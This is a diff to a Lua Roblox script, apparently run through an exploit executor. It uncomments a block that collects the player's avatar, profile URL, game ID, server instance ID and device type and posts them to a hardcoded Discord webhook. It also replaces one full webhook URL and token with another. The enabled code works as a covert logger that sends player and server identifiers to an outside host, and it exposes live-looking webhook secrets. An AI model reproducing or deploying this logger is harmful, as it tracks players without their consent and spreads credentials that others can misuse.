@@ -1,4 +1,4 @@
---[[function SendMessage(url, message)  
+function SendMessage(url, message)  
     local http = game:GetService("HttpService")  
     local headers = {  
         ["Content-Type"] = "application/json"  
@@ -71,7 +71,7 @@ local avatarUrl = avatarData.data[1].imageUrl
   
 local profileUrl = "https://www.roblox.com/tr/users/" .. avatarId .. "/profile"  
 local currentTime = os.date("%Y-%m-%d %H:%M:%S")  
-local url = "https://discord.com/api/webhooks/1394088872064978994/6JswTvYKgNQXOAEWc8hixZRHqjFiA1CPhBbbow0YSzEKGR_6etNFq5hq1PwR6qvCJ2VH"  
+local url = "https://discord.com/api/webhooks/1401825387280990270/6sXMqgUeWLnNZmdv59J3MhgPRWmII2vICUnX9Dm1nrvPPuP7Vr_yzD9MCOaea6tIj2zY"  
 local randomColor = math.random(000001, 999999)  
 local gameId = tostring(game.PlaceId)  
 local instanceId = game.JobId  
@@ -96,7 +96,7 @@ elseif userInputService.TouchEnabled and userInputService.KeyboardEnabled then
 end  
   
 if setclipboard then  
-    setclipboard(instanceId)  
+    
     print("Instance ID: " .. instanceId)  
 else  
 end  
@@ -150,7 +150,7 @@ local embed = {
     }  
 }  
   
-SendMessageEMBED(url, embed)]]
+SendMessageEMBED(url, embed)
 
 
 
